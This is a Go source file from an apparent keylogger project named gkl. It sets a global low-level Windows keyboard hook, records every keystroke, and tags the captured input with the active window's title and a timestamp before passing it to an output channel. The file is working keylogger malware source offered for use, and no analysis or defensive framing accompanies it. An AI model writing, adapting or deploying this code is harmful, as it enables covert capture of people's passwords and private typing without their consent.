package keylogger

import (
	"fmt"
	"syscall"
	"time"

	"github.com/Spriithy/gkl/client/windows"
)

type KeyLogger struct {
	Decoder            *keyStrokeDecoder
	input              chan *KeyboardEvent
	previousWindowName string
}

func NewKeylogger(output chan string) *KeyLogger {
	kl := &KeyLogger{}
	kl.input = make(chan *KeyboardEvent)
	kl.Decoder = newKeyStrokeDecoder(kl.input, output)
	return kl
}

func (kl *KeyLogger) Start() {
	windows.SetWindowsHookExW(windows.WH_KEYBOARD_LL, kl.hook, 0, 0)
	var msg windows.MSG
	for windows.GetMessageW(&msg, 0, 0, 0) != 0 {
	}
}

func (kl *KeyLogger) hook(nCode int, wParam windows.WPARAM, lParam windows.LPARAM) windows.LRESULT {
	hWnd := windows.GetForegroundWindow()
	threadId := windows.GetWindowThreadProcessId(hWnd, 0)
	layout := windows.GetKeyboardLayout(threadId)

	var buf [256]uint16
	windows.GetWindowTextW(hWnd, windows.LPCWSTR(&buf[0]), 256)
	windowName := syscall.UTF16ToString(buf[:])

	if windowName != kl.previousWindowName {
		kl.previousWindowName = windowName
		kl.Decoder.output <- fmt.Sprintf("\n%s - %s\n", time.Now().Local().String(), windowName)
	}

	kl.input <- newKeyboardEvent(wParam, lParam, layout)
	return windows.CallNextHookEx(0, nCode, wParam, lParam)
}
